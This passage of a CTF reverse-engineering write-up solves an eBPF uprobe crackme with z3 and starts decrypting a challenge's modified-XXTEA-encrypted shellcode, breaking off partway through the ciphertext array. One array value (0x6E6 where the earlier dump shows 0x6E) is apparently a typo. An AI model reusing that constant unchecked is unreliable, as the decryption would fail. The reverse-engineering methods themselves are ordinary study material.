class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">F4018.elf:file format ELF64-BPF</span><br><span class="line"></span><br><span class="line">Disassembly of section uprobe/func:</span><br><span class="line">uprobe:</span><br><span class="line">       0:79 12 68 00 00 00 00 00 r2 = *(u64 *)(r1 + 104)</span><br><span class="line">       1:67 02 00 00 20 00 00 00 r2 &lt;&lt;= 32</span><br><span class="line">       2:77 02 00 00 20 00 00 00 r2 &gt;&gt;= 32</span><br><span class="line">       3:79 13 70 00 00 00 00 00 r3 = *(u64 *)(r1 + 112)</span><br><span class="line">       4:67 03 00 00 20 00 00 00 r3 &lt;&lt;= 32</span><br><span class="line">       5:77 03 00 00 20 00 00 00 r3 &gt;&gt;= 32</span><br><span class="line">       6:bf 34 00 00 00 00 00 00 r4 = r3</span><br><span class="line">       7:27 04 00 00 c0 6d 00 00 r4 *= 28096</span><br><span class="line">       8:bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">       9:27 05 00 00 88 fb 00 00 r5 *= 64392</span><br><span class="line">      10:0f 45 00 00 00 00 00 00 r5 += r4</span><br><span class="line">      11:79 14 60 00 00 00 00 00 r4 = *(u64 *)(r1 + 96)</span><br><span class="line">      12:67 04 00 00 20 00 00 00 r4 &lt;&lt;= 32</span><br><span class="line">      13:77 04 00 00 20 00 00 00 r4 &gt;&gt;= 32</span><br><span class="line">      14:bf 40 00 00 00 00 00 00 r0 = r4</span><br><span class="line">      15:27 00 00 00 fb 71 00 00 r0 *= 29179</span><br><span class="line">      16:0f 05 00 00 00 00 00 00 r5 += r0</span><br><span class="line">      17:79 11 58 00 00 00 00 00 r1 = *(u64 *)(r1 + 88)</span><br><span class="line">      18:b7 00 00 00 00 00 00 00 r0 = 0</span><br><span class="line">      19:73 0a f8 ff 00 00 00 00 *(u8 *)(r10 - 8) = r0</span><br><span class="line">      20:7b 0a f0 ff 00 00 00 00 *(u64 *)(r10 - 16) = r0</span><br><span class="line">      21:7b 0a e8 ff 00 00 00 00 *(u64 *)(r10 - 24) = r0</span><br><span class="line">      22:67 01 00 00 20 00 00 00 r1 &lt;&lt;= 32</span><br><span class="line">      23:77 01 00 00 20 00 00 00 r1 &gt;&gt;= 32</span><br><span class="line">      24:bf 10 00 00 00 00 00 00 r0 = r1</span><br><span class="line">      25:27 00 00 00 8e cc 00 00 r0 *= 52366</span><br><span class="line">      26:0f 05 00 00 00 00 00 00 r5 += r0</span><br><span class="line">      27:b7 06 00 00 01 00 00 00 r6 = 1</span><br><span class="line">      28:18 00 00 00 95 59 73 a1 00 00 00 00 18 be 00 00 r0 = 209012997183893 ll</span><br><span class="line">      30:5d 05 42 00 00 00 00 00 if r5 != r0 goto +66 &lt;LBB0_5&gt;</span><br><span class="line">      31:bf 35 00 00 00 00 00 00 r5 = r3</span><br><span class="line">      32:27 05 00 00 bf f1 00 00 r5 *= 61887</span><br><span class="line">      33:bf 20 00 00 00 00 00 00 r0 = r2</span><br><span class="line">      34:27 00 00 00 e5 6a 00 00 r0 *= 27365</span><br><span class="line">      35:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      36:bf 45 00 00 00 00 00 00 r5 = r4</span><br><span class="line">      37:27 05 00 00 d3 ad 00 00 r5 *= 44499</span><br><span class="line">      38:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      39:bf 15 00 00 00 00 00 00 r5 = r1</span><br><span class="line">      40:27 05 00 00 84 92 00 00 r5 *= 37508</span><br><span class="line">      41:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      42:18 05 00 00 40 03 54 e5 00 00 00 00 56 a5 00 00 r5 = 181792633258816 ll</span><br><span class="line">      44:5d 50 34 00 00 00 00 00 if r0 != r5 goto +52 &lt;LBB0_5&gt;</span><br><span class="line">      45:bf 35 00 00 00 00 00 00 r5 = r3</span><br><span class="line">      46:27 05 00 00 85 dd 00 00 r5 *= 56709</span><br><span class="line">      47:bf 20 00 00 00 00 00 00 r0 = r2</span><br><span class="line">      48:27 00 00 00 28 80 00 00 r0 *= 32808</span><br><span class="line">      49:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      50:bf 45 00 00 00 00 00 00 r5 = r4</span><br><span class="line">      51:27 05 00 00 2d 65 00 00 r5 *= 25901</span><br><span class="line">      52:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      53:bf 15 00 00 00 00 00 00 r5 = r1</span><br><span class="line">      54:27 05 00 00 12 e7 00 00 r5 *= 59154</span><br><span class="line">      55:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      56:18 05 00 00 a3 4d 48 74 00 00 00 00 f3 a6 00 00 r5 = 183564558159267 ll</span><br><span class="line">      58:5d 50 26 00 00 00 00 00 if r0 != r5 goto +38 &lt;LBB0_5&gt;</span><br><span class="line">      59:bf 35 00 00 00 00 00 00 r5 = r3</span><br><span class="line">      60:27 05 00 00 2c 82 00 00 r5 *= 33324</span><br><span class="line">      61:bf 20 00 00 00 00 00 00 r0 = r2</span><br><span class="line">      62:27 00 00 00 43 ca 00 00 r0 *= 51779</span><br><span class="line">      63:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      64:bf 45 00 00 00 00 00 00 r5 = r4</span><br><span class="line">      65:27 05 00 00 8e 7c 00 00 r5 *= 31886</span><br><span class="line">      66:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      67:bf 15 00 00 00 00 00 00 r5 = r1</span><br><span class="line">      68:27 05 00 00 3a f2 00 00 r5 *= 62010</span><br><span class="line">      69:0f 50 00 00 00 00 00 00 r0 += r5</span><br><span class="line">      70:18 05 00 00 77 72 5a 48 00 00 00 00 9c b9 00 00 r5 = 204080879923831 ll</span><br><span class="line">      72:5d 50 18 00 00 00 00 00 if r0 != r5 goto +24 &lt;LBB0_5&gt;</span><br><span class="line">      73:63 1a f4 ff 00 00 00 00 *(u32 *)(r10 - 12) = r1</span><br><span class="line">      74:63 4a f0 ff 00 00 00 00 *(u32 *)(r10 - 16) = r4</span><br><span class="line">      75:63 2a ec ff 00 00 00 00 *(u32 *)(r10 - 20) = r2</span><br><span class="line">      76:63 3a e8 ff 00 00 00 00 *(u32 *)(r10 - 24) = r3</span><br><span class="line">      77:18 01 00 00 43 54 46 7b 00 00 00 00 25 73 7d 0a r1 = 755886917287302211 ll</span><br><span class="line">      79:7b 1a d8 ff 00 00 00 00 *(u64 *)(r10 - 40) = r1</span><br><span class="line">      80:18 01 00 00 46 4c 41 47 00 00 00 00 3a 20 48 46 r1 = 5064333215653776454 ll</span><br><span class="line">      82:7b 1a d0 ff 00 00 00 00 *(u64 *)(r10 - 48) = r1</span><br><span class="line">      83:18 01 00 00 45 21 20 59 00 00 00 00 4f 55 52 20 r1 = 2329017756590022981 ll</span><br><span class="line">      85:7b 1a c8 ff 00 00 00 00 *(u64 *)(r10 - 56) = r1</span><br><span class="line">      86:18 01 00 00 57 45 4c 4c 00 00 00 00 20 44 4f 4e r1 = 5642803763628229975 ll</span><br><span class="line">      88:7b 1a c0 ff 00 00 00 00 *(u64 *)(r10 - 64) = r1</span><br><span class="line">      89:b7 06 00 00 00 00 00 00 r6 = 0</span><br><span class="line">      90:73 6a e0 ff 00 00 00 00 *(u8 *)(r10 - 32) = r6</span><br><span class="line">      91:bf a1 00 00 00 00 00 00 r1 = r10</span><br><span class="line">      92:07 01 00 00 c0 ff ff ff r1 += -64</span><br><span class="line">      93:bf a3 00 00 00 00 00 00 r3 = r10</span><br><span class="line">      94:07 03 00 00 e8 ff ff ff r3 += -24</span><br><span class="line">      95:b7 02 00 00 21 00 00 00 r2 = 33</span><br><span class="line">      96:85 00 00 00 06 00 00 00 call 6</span><br><span class="line"></span><br><span class="line">LBB0_5:</span><br><span class="line">      97:bf 60 00 00 00 00 00 00 r0 = r6</span><br><span class="line">      98:95 00 00 00 00 00 00 00 exit</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">r2 = Int(&#x27;r2&#x27;)     # flag[2]</span><br><span class="line">r3 = Int(&#x27;r3&#x27;)     # flag[3]</span><br><span class="line">r4 = Int(&#x27;r4&#x27;)     # flag[1]</span><br><span class="line">r1 = Int(&#x27;r1&#x27;)     # flag[0]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(r3 * 28096 + r2 * 64392 + r4 * 29179 + r1 * 52366 == 209012997183893)</span><br><span class="line">s.add(r3 * 61887 + r2 * 27365 + r4 * 44499 + r1 * 37508 == 181792633258816)</span><br><span class="line">s.add(r3 * 56709 + r2 * 32808 + r4 * 25901 + r1 * 59154 == 183564558159267)</span><br><span class="line">s.add(r3 * 33324 + r2 * 51779 + r4 * 31886 + r1 * 62010 == 204080879923831)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">assert s.check() == sat</span><br><span class="line"></span><br><span class="line">flag = b&quot;&quot;</span><br><span class="line">m = s.model()</span><br><span class="line"># for i in [r1, r4, r2, r3]:</span><br><span class="line">#     flag += long_to_bytes(m[i].as_long())[::-1]</span><br><span class="line"></span><br><span class="line">for i in [r3, r2, r4, r1]:</span><br><span class="line">    flag += long_to_bytes(m[i].as_long())[::-1]</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"># 0vR3sAlbs8pD2h53</span><br></pre></td></tr></table></figure><h2 id="the-shellcode"><a href="#the-shellcode" class="headerlink" title="the_shellcode"></a>the_shellcode</h2><p>执行程序，dump下来，IDA打开dump文件分析，配合OD动态调试程序，发现↓<br>程序逻辑为先输入base64加密的shellcode（len=352），然后shellcode解密，每一个字节执行rol 3操作，再魔改的xxtea解密，然后再输入flag（len=14）,再根据shellcode验证flag</p><p>xxtea密文是 byte_1A3310[264]</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0xC1</span>, <span class="number">0x74</span>, <span class="number">0x6E</span>, <span class="number">0xA0</span>, </span><br><span class="line">  <span class="number">0x92</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x0C</span>, <span class="number">0x9B</span>, <span class="number">0x42</span>, <span class="number">0x84</span>, <span class="number">0x1E</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, </span><br><span class="line">  <span class="number">0xC9</span>, <span class="number">0x44</span>, <span class="number">0x5B</span>, <span class="number">0x8B</span>, <span class="number">0x7B</span>, <span class="number">0xB3</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0xA6</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x3C</span>, <span class="number">0x2D</span>, <span class="number">0x89</span>, <span class="number">0xC5</span>, <span class="number">0x79</span>, <span class="number">0x97</span>, <span class="number">0xDA</span>, <span class="number">0x7A</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0xAA</span>, <span class="number">0x51</span>, <span class="number">0x1D</span>, <span class="number">0x03</span>, <span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x02</span>, <span class="number">0xBA</span>, <span class="number">0x26</span>, </span><br><span class="line">  <span class="number">0xA5</span>, <span class="number">0x4F</span>, <span class="number">0x4A</span>, <span class="number">0xD6</span>, <span class="number">0xFA</span>, <span class="number">0x32</span>, <span class="number">0x91</span>, <span class="number">0x60</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x56</span>, <span class="number">0x67</span>, <span class="number">0xDD</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0x15</span>, <span class="number">0x93</span>, <span class="number">0xF7</span>, <span class="number">0xA5</span>, <span class="number">0x1D</span>, <span class="number">0x99</span>, <span class="number">0xEB</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x21</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x2C</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0x82</span>, <span class="number">0x1A</span>, <span class="number">0x76</span>, <span class="number">0xA7</span>, <span class="number">0x76</span>, <span class="number">0x18</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0xB4</span>, </span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x37</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0x40</span>, <span class="number">0xC5</span>, <span class="number">0x2C</span>, <span class="number">0x51</span>, <span class="number">0x6F</span>, <span class="number">0xA1</span>, </span><br><span class="line">  <span class="number">0x94</span>, <span class="number">0xC5</span>, <span class="number">0x8C</span>, <span class="number">0x4F</span>, <span class="number">0xE2</span>, <span class="number">0xD0</span>, <span class="number">0xE9</span>, <span class="number">0xE2</span>, <span class="number">0xA3</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0xD5</span>, <span class="number">0xC2</span>, <span class="number">0x9C</span>, <span class="number">0x0A</span>, <span class="number">0x1D</span>, <span class="number">0xE6</span>, <span class="number">0x29</span>, <span class="number">0x46</span>, <span class="number">0xE3</span>, <span class="number">0x29</span>, </span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x63</span>, <span class="number">0xD7</span>, <span class="number">0x8A</span>, <span class="number">0x4E</span>, <span class="number">0xCA</span>, <span class="number">0x71</span>, <span class="number">0xAF</span>, <span class="number">0xDF</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0x68</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x3A</span>, <span class="number">0xBC</span>, <span class="number">0x2F</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0xD6</span>, <span class="number">0xE5</span>, <span class="number">0xBB</span>, <span class="number">0x0D</span>, <span class="number">0xAD</span>, <span class="number">0xE3</span>, <span class="number">0xBB</span>, <span class="number">0xF7</span>, <span class="number">0x62</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x8C</span>, <span class="number">0xD6</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x95</span>, <span class="number">0x0E</span>, <span class="number">0x88</span>, <span class="number">0xBA</span>, <span class="number">0x25</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, <span class="number">0x7A</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0xE0</span>, <span class="number">0x7C</span>, <span class="number">0x9A</span>, </span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xC9</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xF7</span>, <span class="number">0x9E</span>, <span class="number">0x5D</span>, <span class="number">0xDE</span>, <span class="number">0xAC</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xB9</span>, <span class="number">0x13</span>, <span class="number">0x8E</span>, <span class="number">0xEC</span>, <span class="number">0xB2</span>, <span class="number">0x2D</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0xEE</span>, </span><br><span class="line">  <span class="number">0xCE</span>, <span class="number">0x5F</span>, <span class="number">0x7C</span>, <span class="number">0x92</span>, <span class="number">0x5D</span>, <span class="number">0xA8</span>, <span class="number">0xE3</span>, <span class="number">0xC9</span>, <span class="number">0x6B</span>, <span class="number">0xB5</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0xAC</span>, <span class="number">0x12</span>, <span class="number">0xE7</span>, <span class="number">0xB6</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0xCD</span>, </span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1C</span>, <span class="number">0xF1</span>, <span class="number">0xFC</span>, <span class="number">0xEE</span>, <span class="number">0x75</span>, <span class="number">0x70</span>, <span class="number">0xF5</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, </span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x35</span>, <span class="number">0x6A</span>, <span class="number">0xD6</span>, <span class="number">0xD4</span>, <span class="number">0xB9</span>, <span class="number">0x5A</span>, <span class="number">0x10</span>, <span class="number">0x95</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x44</span>, <span class="number">0xB0</span>, <span class="number">0x1B</span>, <span class="number">0x59</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xB2</span>, <span class="number">0x1A</span>, <span class="number">0x26</span>, </span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0x7B</span>, <span class="number">0xD8</span>, <span class="number">0x29</span>, <span class="number">0xD1</span>, <span class="number">0x23</span>, <span class="number">0xCD</span>, <span class="number">0x52</span>, <span class="number">0xE7</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x8F</span>, <span class="number">0xA7</span>, <span class="number">0x4E</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>魔改为 <code>#define MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </code> </p><p>解密shellcode的脚本为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x61C88647  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line"><span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">&#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span> - rounds * DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum += DELTA;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc_shellcode[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0xC1</span>, <span class="number">0x74</span>, <span class="number">0x6E6</span>, <span class="number">0xA0</span>,</span><br><span class="line">  <span class="number">0x92</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x0C</span>, <span class="number">0x9B</span>, <span class="number">0x42</span>, <span class="number">0x84</span>, <span class="number">0x1E</span>, <span class="number">0x28</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xC9</span>, <span class="number">0x44</span>, <span class="number">0x5B</span>, <span class="number">0x8B</span>, <span class="number">0x7B</span>, <span class="number">0xB3</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0xA6</span>,</span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x3C</span>, <span class="number">0x2D</span>, <span class="number">0x89</span>, <span class="number">0xC5</span>, <span class="number">0x79</span>, <span class="number">0x97</span>, <span class="number">0xDA</span>, <span class="number">0x7A</span>, <span class="number">0x0D</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0xAA</span>, <span class="number">0x51</span>, <span class="number">0x1D</span>, <span class="number">0x03</span>, <span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x02</span>, <span class="number">0xBA</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0xA5</span>, <span class="number">0x4F</span>, <span class="number">0x4A</span>, <span class="number">0xD6</span>, <span class="number">0xFA</span>, <span class="number">0x32</span>, <span class="number">0x91</span>, <span class="number">0x60</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x56</span>, <span class="number">0x67</span>, <span class="number">0xDD</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x55</span>,</span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0x15</span>, <span class="number">0x93</span>, <span class="number">0xF7</span>, <span class="number">0xA5</span>, <span class="number">0x1D</span>, <span class="number">0x99</span>, <span class="number">0xEB</span>, <span class="number">0x3A</span>,</span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x21</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x2C</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x2B</span>,</span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0x82</span>, <span class="number">0x1A</span>, <span class="number">0x76</span>, <span class="number">0xA7</span>, <span class="number">0x76</span>, <span class="number">0x18</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0xB4</span>,</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x37</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0x40</span>, <span class="number">0xC5</span>, <span class="number">0x2C</span>, <span class="number">0x51</span>, <span class="number">0x6F</span>, <span class="number">0xA1</span>,</span><br><span class="line">  <span class="number">0x94</span>, <span class="number">0xC5</span>, <span class="number">0x8C</span>, <span class="number">0x4F</span>, <span class="number">0xE2</span>, <span class="number">0xD0</span>, <span class="number">0xE9</span>, <span class="number">0xE2</span>, <span class="number">0xA3</span>, <span class="number">0x9C</span>,</span><br><span class="line">  <span class="number">0xD5</span>, <span class="number">0xC2</span>, <span class="number">0x9C</span>, <span class="number">0x0A</span>, <span class="number">0x1D</span>, <span class="number">0xE6</span>, <span class="number">0x29</span>, <span class="number">0x46</span>, <span class="number">0xE3</span>, <span class="number">0x29</span>,</span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x63</span>, <span class="number">0xD7</span>, <span class="number">0x8A</span>, <span class="number">0x4E</span>, <span class="number">0xCA</span>, <span class="number">0x71</span>, <span class="number">0xAF</span>, <span class="number">0xDF</span>, <span 